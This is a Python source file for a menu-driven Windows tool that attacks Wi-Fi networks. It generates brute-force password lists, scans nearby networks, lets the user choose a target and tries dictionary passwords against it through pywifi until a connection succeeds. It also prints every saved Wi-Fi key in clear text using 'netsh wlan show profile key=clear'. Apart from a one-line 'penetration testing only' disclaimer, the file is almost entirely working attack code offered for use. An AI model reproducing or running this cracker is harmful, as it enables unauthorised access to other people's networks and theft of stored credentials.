# Import Library
import os
import time
import sys
import pywifi
import subprocess
import shutil
import urllib.request
import itertools as its
from pywifi import *
from subprocess import check_output

# def for print error
def error() :
    os.system("cls")
    print("""
███████╗██████╗░██████╗░░█████╗░██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝
██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗
███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
""")
    anim = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    for i in range(len(anim)):
        time.sleep(0.2)
        sys.stdout.write("\rNot Found Command! Try again.." + anim[i % len(anim)])
        sys.stdout.flush()

    start()

# def for exit
def exit_scipt() :
    os.system("cls")
    print("""
███████╗██╗░░██╗██╗████████╗
██╔════╝╚██╗██╔╝██║╚══██╔══╝
█████╗░░░╚███╔╝░██║░░░██║░░░
██╔══╝░░░██╔██╗░██║░░░██║░░░
███████╗██╔╝╚██╗██║░░░██║░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░

TnkYou For Using In My Script :) """)
    anim2 = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    for i in range(len(anim2)):
        time.sleep(0.2)
        sys.stdout.write("\rExit " + anim2[i % len(anim2)])
        sys.stdout.flush()
    os.system("cls")
    os.system("exit")  
    
    
# def for about me
def melfex() :
    os.system("cls")
    print("""
███╗░░░███╗██████╗░░░░░░░███╗░░░███╗███████╗██╗░░░░░███████╗███████╗██╗░░██╗
████╗░████║██╔══██╗░░░░░░████╗░████║██╔════╝██║░░░░░██╔════╝██╔════╝╚██╗██╔╝
██╔████╔██║██████╔╝█████╗██╔████╔██║█████╗░░██║░░░░░█████╗░░█████╗░░░╚███╔╝░
██║╚██╔╝██║██╔══██╗╚════╝██║╚██╔╝██║██╔══╝░░██║░░░░░██╔══╝░░██╔══╝░░░██╔██╗░
██║░╚═╝░██║██║░░██║░░░░░░██║░╚═╝░██║███████╗███████╗██║░░░░░███████╗██╔╝╚██╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝

Hi Frind!
I am Farshad. a Security student and Web and Telegram bot designer From Iran :)

You Can Find Me in : 
InstaGram >>> www.instagram.com/DevFrshd
TelleGram >>> T.me/MrMelfex
GitHub >>> MrMelfex
Contact >>> MelfexMr@Gmail.com

EXIT >> [B]""")
    melfex_qustion = input("--->>>  ")
    if melfex_qustion.upper == "B" :
        start()
    else :
        melfex()

# def for help
def help() :
    os.system("cls")
    print("""
██╗░░██╗███████╗██╗░░░░░██████╗░░░░░░░░██████╗░██╗░░░██╗███████╗░██████╗████████╗██╗░█████╗░███╗░░██╗░██████╗
██║░░██║██╔════╝██║░░░░░██╔══██╗░░░░░░██╔═══██╗██║░░░██║██╔════╝██╔════╝╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
███████║█████╗░░██║░░░░░██████╔╝█████╗██║██╗██║██║░░░██║█████╗░░╚█████╗░░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
██╔══██║██╔══╝░░██║░░░░░██╔═══╝░╚════╝╚██████╔╝██║░░░██║██╔══╝░░░╚═══██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
██║░░██║███████╗███████╗██║░░░░░░░░░░░░╚═██╔═╝░╚██████╔╝███████╗██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░░░░░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░

Welcome to the help and questions section.

Menu 1 >>> In this part, you will be able to create a password list to crack Wi-Fi, etc.,
by choosing the range of numbers in the first part, the number of password digits in the second part, and the file name in the third part.
Menu 2 >>> In this section, you will be able to attack your nearby WiFi.,
In this way, after scanning Wi-Fi, you enter the name of the password list and wait for cracking
Menu 3 >>> With this command, you will be able to see saved Wi-Fi passwords in your system.,
To do this, you don't need to do anything special, but after selecting the module, the list will be displayed for you
Menu 4 >>> With this command, your source will be updated in case of an update by me
Menu 6 >>> You can see my biography here
*** Contact Me --->>> MelfexMr@Gmail.com

EXIT >> [B]""")
    help_qustion = input("--->>>  ")
    if help_qustion.upper == "B" :
        start()
    else :
        help()
# def for update
def update() :
    print("SOON..\nFOR BACK INTER [B]")
    update_q = input("--->>>  ")
    if update_q.lower == "B" :
        start()
    else :
        update()

# def for saved wifi 
def wifi_saved() :
    os.system("cls")
    print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░██████╗░█████╗░██╗░░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗╚█████╗░███████║╚██╗░██╔╝█████╗░░██║░░██║
░░████╔═████║░██║██╔══╝░░██║╚════╝░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║░░██║
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░██████╔╝██║░░██║░░╚██╔╝░░███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░
                                                 <<< Coded BY MR-MELFEX >>>

for start SEND >> [Y] Else for Back to main page >> [B]""")
    wifi_saved_qustien = input("--->>>  ")
    if wifi_saved_qustien.upper() == "Y" :
        print("\n")
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print ("{:<30}|  {:<}".format(i, ""))
        print("\n\nBack To Main Page >> [B]")
        wifi_saved_qustien_2 = input("--->>>  ")
        if wifi_saved_qustien_2.upper() == "B" :
            start()
        else :
            wifi_saved()
    elif wifi_saved_qustien.upper() == "B" :
        start()
    else :
        wifi_saved()

# def fot crack wifi 
def wifi_cracker() :
    os.system("cls")
    print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                            <<< Coded By Mr-Melfex >>>

Welcome to Wifa crack and penetration test area.
You will be able to crack Wi-Fi by creating a password list and this module
NOTE >>> This script is written only for learning and penetration testing,
malicious use will be the responsibility of the person!!

However, do you want to proceed with the process? [Y/N]""")
    wifi_cracker_q = input("--->>>  ")
    if wifi_cracker_q.upper() == "Y" :
        def wifi_scan():
            wifi = pywifi.PyWiFi()
            interface = wifi.interfaces()[0]
            interface.scan()
            print("\n\n")
            animati2 = "|/-\\"
            for i in range(75):
                time.sleep(0.1)
                sys.stdout.write("\rScanning nearby Wi-Fis. be patient " + animati2[i % len(animati2)])
                sys.stdout.flush()
            os.system("cls")
            print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                            <<< Coded By Mr-Melfex >>>
""")
            print("Scan Complate! See Wi-fi List: \n")
            print('<<< WIFI LIST >>>'.center(35, '-') + "\n")
            print('\r{:11}{:17}{}'.format('Num', 'Strength', 'Name'))
            bss = interface.scan_results()
            wifi_name_set = set()
            for w in bss:
                wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
                wifi_name_set.add(wifi_name_and_signal)
            wifi_name_list = list(wifi_name_set)
            wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
            num = 0
            while num < len(wifi_name_list):
                print('\r{:<11d}{:<17d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
                num += 1
            print("\n" + '-' * 35)
            return wifi_name_list
        def wifi_password_crack(wifi_name):
            print("\n\nPlease use filename of password dictionary used for the brute force attack")
            wifi_dic_path = input("--->>>  ")
            with open(wifi_dic_path, 'r') as f:
                for pwd in f:
                    pwd = pwd.strip('\n')
                    wifi = pywifi.PyWiFi()
                    interface = wifi.interfaces()[0]
                    interface.disconnect()
                    while interface.status() == 4:
                        pass
                    profile = pywifi.Profile()
                    profile.ssid = wifi_name
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = pwd
                    interface.remove_all_network_profiles()
                    tmp_profile = interface.add_network_profile(profile)
                    interface.connect(tmp_profile)
                    start_time = time.time()
                    while time.time() - start_time < 0.1:
                        if interface.status() == 4:
                            print(f'\rConnection Succeeded！Password：{pwd}')
                            exit(0)
                        else:
                            os.system("cls")
                            time_no = time
                            print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                                <<< Coded By Mr-Melfex >>>
Testing Passwords [Time >>> %s]
""" % (time_no))
                            print(f'\rTry Concting with > {pwd}', end='')
        def main():
            exit_flag = 0
            target_num = -1
            while not exit_flag:
                try:
                    wifi_list = wifi_scan()
                    choose_exit_flag = 0
                    while not choose_exit_flag:
                        try:
                            print("\n\nPlease Choose a Target NUM Wi-Fi")
                            target_num = int(input("--->>> "))
                            if target_num in range(len(wifi_list)):
                                while not choose_exit_flag:
                                    try:
                                        print("\n\n")
                                        print(f"Sure Chosen Wi-Fi [{wifi_list[target_num][1]}] Target? [Y/N]")
                                        choose = input("--->>> ")
                                        if choose.upper() == 'Y':
                                            choose_exit_flag = 1
                                        elif choose.upper == 'N':
                                            main()
                                        else:
                                            print('only Y/N pls!')
                                    except ValueError:
                                        print('only Y/N pls!')
                                if choose_exit_flag == 1:
                                    break
                                else:
                                    print('\n\nPlease Choose a Target NUM Wi-Fi')
                        except ValueError:
                            print('Please only enter a number!')
                    wifi_password_crack(wifi_list[target_num][1])
                    print('-' * 38)
                    exit_flag = 1
                except Exception as e:
                    print(e)
                    raise e
        if __name__ == '__main__':
            main()
    elif wifi_cracker_q.upper() == "N" :
        start()
    else :
        wifi_cracker()
    

# def for creat password list
def creat_pass_list() :
    os.system("cls")
    print("""
██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░░░░░░░██╗░░░░░██╗░██████╗████████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗░░░░░░██║░░░░░██║██╔════╝╚══██╔══╝
██████╔╝███████║╚█████╗░╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║█████╗██║░░░░░██║╚█████╗░░░░██║░░░
██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║╚════╝██║░░░░░██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝░░░░░░███████╗██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░░░░░░░╚══════╝╚═╝╚═════╝░░░░╚═╝░░░
                                                                            <<< Coded BY MR-MELFEX >>>

Welcome to the create password list area.
You can create a file with your name and extension here and create passwords

However, do you want to proceed with the process? [Y/N]""")
    creat_pass_list_q = input("--->>>  ")
    if creat_pass_list_q.upper() == "Y" :
        print("\n\nWhat do your passwords consist of? You can use numbers, letters, hashtags, etc")
        pass_renge = str(input("--->>>  "))
        print("\n\nSpecify how many digits your passwords should be (ONLY NUMBRT!)")
        pass_number = int(input("--->>>  "))
        print("\n\nChoose a name for the file")
        file_name = str(input("--->>>  "))
        pass_info = its.product(pass_renge, repeat=pass_number)
        creat_file = open("%s.txt" %(file_name), "a")
        print("\n\n")
        animati = "|/-\\"
        for i in range(70):
            time.sleep(0.1)
            sys.stdout.write("\rCreating File. Pleas Paint.. " + animati[i % len(animati)])
            sys.stdout.flush()
        os.system("cls")
        print("""
██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░░░░░░░██╗░░░░░██╗░██████╗████████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗░░░░░░██║░░░░░██║██╔════╝╚══██╔══╝
██████╔╝███████║╚█████╗░╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║█████╗██║░░░░░██║╚█████╗░░░░██║░░░
██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║╚════╝██║░░░░░██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝░░░░░░███████╗██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░░░░░░░╚══════╝╚═╝╚═════╝░░░░╚═╝░░░
""")
        print("\n\nThe file was created successfully! Do you want to put passwords in the file? [Y/N]" )
        creat_qustien = input("--->>>  ")
        if creat_qustien.upper() == "Y" :
            print("\n\n")
            animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
            for i in range(len(animation)):
                time.sleep(3)
                sys.stdout.write("\rCreating Password.. " + animation[i % len(animation)])
                sys.stdout.flush()
            for i in pass_info :
                creat_file.write("".join(i))
                creat_file.write("".join("\n"))
            creat_file.close
            os.system("cls")
            print("""
██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░░░░░░░██╗░░░░░██╗░██████╗████████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗░░░░░░██║░░░░░██║██╔════╝╚══██╔══╝
██████╔╝███████║╚█████╗░╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║█████╗██║░░░░░██║╚█████╗░░░░██║░░░
██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║╚════╝██║░░░░░██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝░░░░░░███████╗██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░░░░░░░╚══════╝╚═╝╚═════╝░░░░╚═╝░░░

Puting Password To File Complate!\n""")
            print('<<< FILE INFO >>>'.center(35, '-') + "\n")
            print("File Name > %s\nDigits Password >> [%s]\nConsist Password >>> %s" % (file_name, pass_number, pass_renge))
            print("\n" + "-" * 35 + "\n\nFor Back to Main Page Inter [B]" )
            creat_pass_list_q3 = input("--->>>  ")
            if creat_pass_list_q3.upper() == "B" :
                start()
            else :
                creat_pass_list()
        elif creat_qustien.upper() == "N" :
            print("")
        else :
            print("")
    elif creat_pass_list_q.upper() == "N" :
        start()
    else :
        creat_pass_list()

# def for start 
def start() :
    os.system("cls")
    print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░░██████╗░██████╗██╗░██████╗████████╗░█████╗░███╗░░██╗████████╗
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔════╝██╔════╝██║██╔════╝╚══██╔══╝██╔══██╗████╗░██║╚══██╔══╝
░╚██╗████╗██╔╝██║█████╗░░██║█████╗███████║╚█████╗░╚█████╗░██║╚█████╗░░░░██║░░░███████║██╔██╗██║░░░██║░░░
░░████╔═████║░██║██╔══╝░░██║╚════╝██╔══██║░╚═══██╗░╚═══██╗██║░╚═══██╗░░░██║░░░██╔══██║██║╚████║░░░██║░░░
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░██║░░██║██████╔╝██████╔╝██║██████╔╝░░░██║░░░██║░░██║██║░╚███║░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░
                                                                             <<< Coded By MR-MELFEX >>>

1) Creating a password list                     2) Crack Wifi
3) Saved Wi-Fis                                 4) Check for Update 
5) Help and Questions                           6) Abut From MR-MELFEX
0) EXIT


Hello dear, welcome.
To continue working select one of the options above and send it.
Meanwhile, you can visit the "HELP" module to see and how to work with this script.
Yours truly, < MR-MELFEX > :)
----------------------------------------------------------------------------------
For Start Choese Number and Inter""")
    start_qustion = input("--->>>  ")
    if start_qustion == "1" :
        creat_pass_list()
    elif start_qustion == "2" :
        wifi_cracker()
    elif start_qustion == "3" :
        wifi_saved()
    elif start_qustion == "4" :
        update()
    elif start_qustion == "5" :
        help()
    elif start_qustion == "6" :
        melfex()
    elif start_qustion == "0" :
        exit_scipt()
    else :
        error()

start() # start script